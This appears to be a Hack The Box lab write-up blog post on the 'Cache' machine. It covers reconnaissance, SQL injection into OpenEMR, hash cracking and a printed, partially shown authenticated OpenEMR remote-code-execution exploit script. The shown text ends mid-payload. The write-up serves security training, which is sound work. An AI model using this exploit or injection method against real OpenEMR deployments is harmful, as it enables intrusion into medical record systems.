<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="description" content="Hack The Box Machine - Cache"><title>HTB Cache Writeup | zRyuki</title><meta name="generator" content="Jekyll v4.0.0" /><meta property="og:title" content="HTB Cache Writeup" /><meta name="author" content="zRyuki" /><meta property="og:locale" content="en_US" /><meta name="description" content="Hack The Box Machine - Cache" /><meta property="og:description" content="Hack The Box Machine - Cache" /><link rel="canonical" href="https://zeroryuki.github.io/posts/cache/" /><meta property="og:url" content="https://zeroryuki.github.io/posts/cache/" /><meta property="og:site_name" content="zRyuki" /><meta property="og:image" content="https://zeroryuki.github.io/img/Cache/badge.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-13T23:02:50+08:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zeroryuki.github.io/img/Cache/badge.png" /><meta property="twitter:title" content="HTB Cache Writeup" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@zRyuki" /><meta name="google-site-verification" content="uR4O3tdC8ptzD19y4h81kQmgw4DIjwMC-FIW5gIrfkM" /> <script type="application/ld+json"> {"headline":"HTB Cache Writeup","dateModified":"2020-05-13T23:02:50+08:00","datePublished":"2020-05-13T23:02:50+08:00","author":{"@type":"Person","name":"zRyuki"},"description":"Hack The Box Machine - Cache","mainEntityOfPage":{"@type":"WebPage","@id":"https://zeroryuki.github.io/posts/cache/"},"image":"https://zeroryuki.github.io/img/Cache/badge.png","@type":"BlogPosting","url":"https://zeroryuki.github.io/posts/cache/","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/icons.css"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/custom.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><meta content="zRyuki" property="og:site_name"><meta content="HTB Cache Writeup" property="og:title"><meta content="article" property="og:type"><meta content="Hack The Box Machine - Cache" property="og:description"><meta content="https://zeroryuki.github.io/posts/cache/" property="og:url"><meta content="2020-05-13T23:02:50+08:00" property="article:published_time"><meta content="https://zeroryuki.github.io/about/" property="article:author"><meta content="https://zeroryuki.github.io/img/Cache/badge.png" property="og:image"><meta content="machine" property="article:section"><meta content="htb" property="article:tag"><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="https://avatars2.githubusercontent.com/u/34531838" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">zRyuki</a></div><div id="site-subtitle" class="font-italic">Systems were built to be owned</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/zeroryuki" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="javascript:window.open('mailto:' + ['zeroryuki','gmail.com'].join('@'))"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" target="_blank"> <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB Cache Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB Cache Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Wed, May 13, 2020, 11:02 PM +0800"> May 13, 2020 <i class="unloaded">2020-05-13T23:02:50+08:00</i> </span> by <span class="author"> zRyuki </span></div></div><div class="row"><div class="col-lg-6"> <img src="/img/Cache/icon.png"></div><div class="col-lg-5"><h2 data-toc-skip class="text-center">Cache</h2><p></p><table class="table table-hover table-striped"><tbody><tr><td class="text-right">OS:<td> <img src="/img/Linux.png" height="15"> Linux<tr><td class="text-right">Difficulty:<td> <span class="text-warning bold"> Medium</span><tr><td class="text-right">Points:<td><span class="text-success">30</span><tr><td class="text-right">Release:<td>09 May 2020<tr><td class="text-right">IP:<td>10.10.10.188</table></div></div><div class="post-content"><h2 id="information-gathering">Information Gathering</h2><p>Begin my recon with standard nmap</p><h3 id="nmap">Nmap</h3><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>Nmap 7.80SVN scan initiated Wed May 13 14:16:56 2020 as: nmap <span class="nt">-vv</span> <span class="nt">--reason</span> <span class="nt">-Pn</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">--version-all</span> <span class="nt">-oN</span> /home/z3r0/CTF/HTB/Machine/Cache/scans/_quick_tcp_nmap.txt <span class="nt">-oX</span> /home/z3r0/CTF/HTB/Machine/Cache/scans/xml/_quick_tcp_nmap.xml hms.htb
<span class="go">Nmap scan report for hms.htb (10.10.10.188)
Host is up, received user-set (0.18s latency).
rDNS record for 10.10.10.188: cache
Scanned at 2020-05-13 14:16:56 +08 for 36s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE    REASON  VERSION
22/tcp open  tcpwrapped syn-ack
| ssh-hostkey: 
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFAHWTqc7a2Az0RjFRBeGhfQkpQrBmEcMntikVFn2frnNPZklPdV7RCy2VW7Ae+LnyJU4Nq2LYqp2zfps+BZ3H4=
|   256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMnbsx7/pCTUKU7WwHrL/d0YS9c99tRraIPvg5zrRpiF
80/tcp open  http       syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6CE8D3334381134EB0A89D8FECE6EEB2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: OpenEMR Login
|_Requested resource was interface/login/login.php?site=default

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Wed May 13 14:17:32 2020 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>36.41 seconds
</pre></table></code></div></div><p>Port opened: <strong>22, 80</strong></p><h3 id="cachehtb">cache.htb</h3><p>Visited the site, and look for useful info.</p><h4 id="home">Home</h4><p><img src="/img/Cache/2020-05-13-23-46-36.png" alt="" /></p><h4 id="login">Login</h4><p>The login link clearly in the header nav, and I went to it straight away.</p><p><img src="/img/Cache/2020-05-13-23-47-05.png" alt="" /></p><h5 id="source-code">source code</h5><p>Look at the source code, wish for juicy comments or so, and found unusual jquery dir</p><p><img src="/img/Cache/2020-05-13-23-49-03.png" alt="" /></p><p><strong>jquery/functionality.js</strong></p><p>Look on the content, there was harcoded password and username ash</p><p><img src="/img/Cache/2020-05-13-23-50-35.png" alt="" /></p><p>Successfully logged in using login link, but got site maintenance message</p><p><img src="/img/Cache/2020-05-14-00-55-24.png" alt="" /></p><h4 id="author">Author</h4><p>Looking for another info, found probably another entry.</p><p><img src="/img/Cache/2020-05-13-23-52-37.png" alt="" /></p><p>Just put hms.htb in my hosts file, and try access it</p><h3 id="hmshtb">hms.htb</h3><p>Went to the main site, redirected to /interface URL with login UI as openEMR service.</p><p><img src="/img/Cache/2020-05-13-23-59-57.png" alt="" /></p><p><strong>gobuster</strong></p><p>Run basic scan with gobuster, returned lot of url.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="go">/.hta (Status: 403) [Size: 272]
/.hta.html (Status: 403) [Size: 272]
/.hta.php (Status: 403) [Size: 272]
/.hta.asp (Status: 403) [Size: 272]
/.hta.aspx (Status: 403) [Size: 272]
/.hta.jsp (Status: 403) [Size: 272]
/.hta.txt (Status: 403) [Size: 272]
/.htaccess (Status: 403) [Size: 272]
/.htaccess.txt (Status: 403) [Size: 272]
/.htaccess.html (Status: 403) [Size: 272]
/.htaccess.php (Status: 403) [Size: 272]
/.htaccess.asp (Status: 403) [Size: 272]
/.htaccess.aspx (Status: 403) [Size: 272]
/.htaccess.jsp (Status: 403) [Size: 272]
/.htpasswd (Status: 403) [Size: 272]
/.htpasswd.jsp (Status: 403) [Size: 272]
/.htpasswd.txt (Status: 403) [Size: 272]
/.htpasswd.html (Status: 403) [Size: 272]
/.htpasswd.php (Status: 403) [Size: 272]
/.htpasswd.asp (Status: 403) [Size: 272]
/.htpasswd.aspx (Status: 403) [Size: 272]
/LICENSE (Status: 200) [Size: 35147]
/admin.php (Status: 200) [Size: 937]
/admin.php (Status: 200) [Size: 937]
/config (Status: 301) [Size: 303]
/contrib (Status: 301) [Size: 304]
/controller.php (Status: 200) [Size: 37]
/controllers (Status: 301) [Size: 308]
/custom (Status: 301) [Size: 303]
/images (Status: 301) [Size: 303]
/index.php (Status: 302) [Size: 0]
/index.php (Status: 302) [Size: 0]
/interface (Status: 301) [Size: 306]
/javascript (Status: 301) [Size: 307]
/library (Status: 301) [Size: 304]
/modules (Status: 301) [Size: 304]
/portal (Status: 301) [Size: 303]
/public (Status: 301) [Size: 303]
/server-status (Status: 403) [Size: 272]
/services (Status: 301) [Size: 305]
/setup.php (Status: 200) [Size: 1214]
/sites (Status: 301) [Size: 302]
/sql (Status: 301) [Size: 300]
/templates (Status: 301) [Size: 306]
/tests (Status: 301) [Size: 302]
</span></pre></table></code></div></div><h3 id="adminphp">admin.php</h3><p>With promising name, admin.php, I tried to access it, and got openEMR version.</p><p><img src="/img/Cache/2020-05-14-00-04-38.png" alt="" /></p><h3 id="searchsploit">SearchSploit</h3><p>Search about openEMR in searchsploit, well, it returned with several exploits, and the exact version listed as well.</p><p><img src="/img/Cache/2020-05-14-00-06-15.png" alt="" /></p><p>Inspecting the exploit code, it needs authenticated user to run it. Using ash creds as above, failed. Gotta find the right cred.</p><p>Searching for another entry point, found useful reading material.</p><p><a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf</a></p><h2 id="exploitation">Exploitation</h2><h3 id="sqli">SQLi</h3><p>Following the article, that was a vuln report on exact version of openEMR. Read through it, got lot of sqli vuln. I picked <code class="highlighter-rouge">add_edit_event_user.php</code> URL.</p><p><strong><em>NOTE: The 1st url was <code class="highlighter-rouge">find_appt_popup_user.php</code>, tested it, output was extremely slow, and I have to keep grabing new cookies for burp file. Due to that, I moved to 2nd url</em></strong></p><p><img src="/img/Cache/2020-05-14-00-08-52.png" alt="" /></p><h4 id="sqlmap">SqlMap</h4><p>First I intercept the request in burp and save it in file to supply it to sqlmap. With request file saved as <code class="highlighter-rouge">burp</code>, run sqlmap with that file as request.</p><p>And sqli confirmed.</p><p><img src="/img/Cache/2020-05-14-00-13-43.png" alt="" /></p><p>And got the creds</p><p><img src="/img/Cache/2020-05-14-00-15-20.png" alt="" /></p><h3 id="crack-the-creds">Crack the creds</h3><p>With salted cred dumped, cracked it using john.</p><p><img src="/img/Cache/2020-05-14-00-16-31.png" alt="" /></p><h3 id="rce-script">RCE script</h3><p>Now I have the valid cred pair, I’m able to run the exploit code from searchsploit</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">ap</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">"OpenEMR RCE"</span><span class="p">)</span>
<span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"host"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Path to OpenEMR (Example: http://127.0.0.1/openemr)."</span><span class="p">)</span>
<span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-u"</span><span class="p">,</span> <span class="s">"--user"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Admin username"</span><span class="p">)</span>
<span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-p"</span><span class="p">,</span> <span class="s">"--password"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Admin password"</span><span class="p">)</span>
<span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-c"</span><span class="p">,</span> <span class="s">"--cmd"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Command to run."</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="nb">ascii</span> <span class="o">=</span> <span class="s">"&gt; .---.  ,---.  ,---.  .-. .-.,---.          ,---.    &lt;</span><span class="si">\</span><span class="se">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"&gt;/ .-. ) | .-.</span><span class="si">\</span><span class="err"> | .-</span><span class="se">'</span><span class="s">  |  </span><span class="si">\</span><span class="err">| || .-</span><span class="se">'</span><span class="s">  |</span><span class="si">\</span><span class="err">    /|| .-.</span><span class="se">\</span><span class="s">   &lt;</span><span class="si">\</span><span class="se">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"&gt;| | |(_)| |-' )| `-.  |   | || `-.  |(</span><span class="si">\</span><span class="err">  / || `-</span><span class="se">'</span><span class="s">/   &lt;</span><span class="si">\</span><span class="se">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"&gt;| | | | | |--' | .-'  | |</span><span class="si">\</span><span class="err">  || .-</span><span class="se">'</span><span class="s">  (_)</span><span class="si">\</span><span class="err">/  ||   (    &lt;</span><span class="se">\</span><span class="s">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"&gt;</span><span class="si">\</span><span class="err"> `-</span><span class="se">'</span><span class="s"> / | |    |  `--.| | |)||  `--.| </span><span class="si">\</span><span class="err">  / || |</span><span class="se">\</span><span class="s"> </span><span class="si">\</span><span class="err">   &lt;</span><span class="se">\</span><span class="s">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"&gt; )---'  /(     /( __.'/(  (_)/( __.'| |</span><span class="si">\</span><span class="err">/| ||_| </span><span class="se">\</span><span class="s">)</span><span class="si">\</span><span class="err">  &lt;</span><span class="se">\</span><span class="s">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"&gt;(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) &lt;</span><span class="si">\</span><span class="se">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"                                                       </span><span class="si">\</span><span class="se">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"   ={&gt;   P R O J E C T    I N S E C U R I T Y   &lt;}=    </span><span class="si">\</span><span class="se">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"                                                       </span><span class="si">\</span><span class="se">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"         Twitter : &gt;@Insecurity&lt;                       </span><span class="si">\</span><span class="se">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>
<span class="nb">ascii</span><span class="o">+=</span> <span class="s">"         Site    : &gt;insecurity.sh&lt;                     </span><span class="si">\</span><span class="se">r</span><span class="si">\</span><span class="se">n</span><span class="s">"</span>

<span class="n">green</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">033</span><span class="s">[1;32m"</span>
<span class="n">red</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">033</span><span class="s">[1;31m"</span>
<span class="n">clear</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">033</span><span class="s">[0m"</span>

<span class="n">load</span> <span class="o">=</span> <span class="s">"[&gt;$&lt;] "</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="n">green</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"&lt;"</span><span class="p">,</span> <span class="n">clear</span><span class="p">)</span>
<span class="n">err</span> <span class="o">=</span> <span class="s">"[&gt;-&lt;] "</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="n">red</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"&lt;"</span><span class="p">,</span> <span class="n">clear</span><span class="p">)</span>
<span class="n">intro</span> <span class="o">=</span> <span class="nb">ascii</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="n">green</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"&lt;"</span><span class="p">,</span> <span class="n">clear</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">intro</span><span class="p">)</span>

<span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
    <span class="n">login</span> <span class="o">=</span> <span class="p">{</span><span class="s">"new_login_session_management"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
            <span class="s">"authProvider"</span><span class="p">:</span> <span class="s">"Default"</span><span class="p">,</span>
            <span class="s">"authUser"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">user</span><span class="p">,</span>
            <span class="s">"clearPass"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">password</span><span class="p">,</span>
            <span class="s">"languageChoice"</span><span class="p">:</span> <span class="s">"1"</span>
            <span class="p">}</span>

    <span class="k">print</span><span class="p">(</span><span class="n">load</span> <span class="o">+</span> <span class="s">"Authenticating with "</span> <span class="o">+</span> <span class="n">args</span><span class="p">.</span><span class="n">user</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="n">args</span><span class="p">.</span><span class="n">password</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">host</span> <span class="o">+</span> <span class="s">"/interface/main/main_screen.php?auth=login&amp;site=default"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">login</span><span class="p">)</span>
    <span class="k">if</span> <span class="s">"login_screen.php?error=1&amp;site="</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">err</span> <span class="o">+</span> <span class="s">"Failed to Login."</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="c1"># This will rewrite and replace your current GLOBALS, please modify this if you don't want that.
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"form_save=Save&amp;srch_desc=&amp;form_0=main_info.php&amp;form_1=..%2F..%2Finterface"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"%2Fmain%2Fmessages%2Fmessages.php%3Fform_active%3D1&amp;form_2=1&amp;form_3=tabs_"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"style_full.css&amp;form_4=style_light.css&amp;form_5=__default__&amp;form_6=__default"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"__&amp;form_7=1&amp;form_8=0&amp;form_9=175&amp;form_10=OpenEMR&amp;form_12=1&amp;form_13=0&amp;form_"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"14=0&amp;form_16=1&amp;form_21=1&amp;form_22=1&amp;form_23=1&amp;form_24=1&amp;form_25=http%3A%2F"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"%2Fopen-emr.org%2F&amp;form_26=&amp;form_27=20&amp;form_28=10&amp;form_30=0&amp;form_31=5&amp;for"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"m_32=0&amp;form_37=English+%28Standard%29&amp;form_38=1&amp;form_42=1&amp;form_43=1&amp;form_"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"44=1&amp;form_45=1&amp;form_46=1&amp;form_47=1&amp;form_48=1&amp;form_49=1&amp;form_50=1&amp;form_51="</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"0&amp;form_52=0&amp;form_53=&amp;form_54=2&amp;form_55=.&amp;form_56=%2C&amp;form_57=%24&amp;form_58="</span>
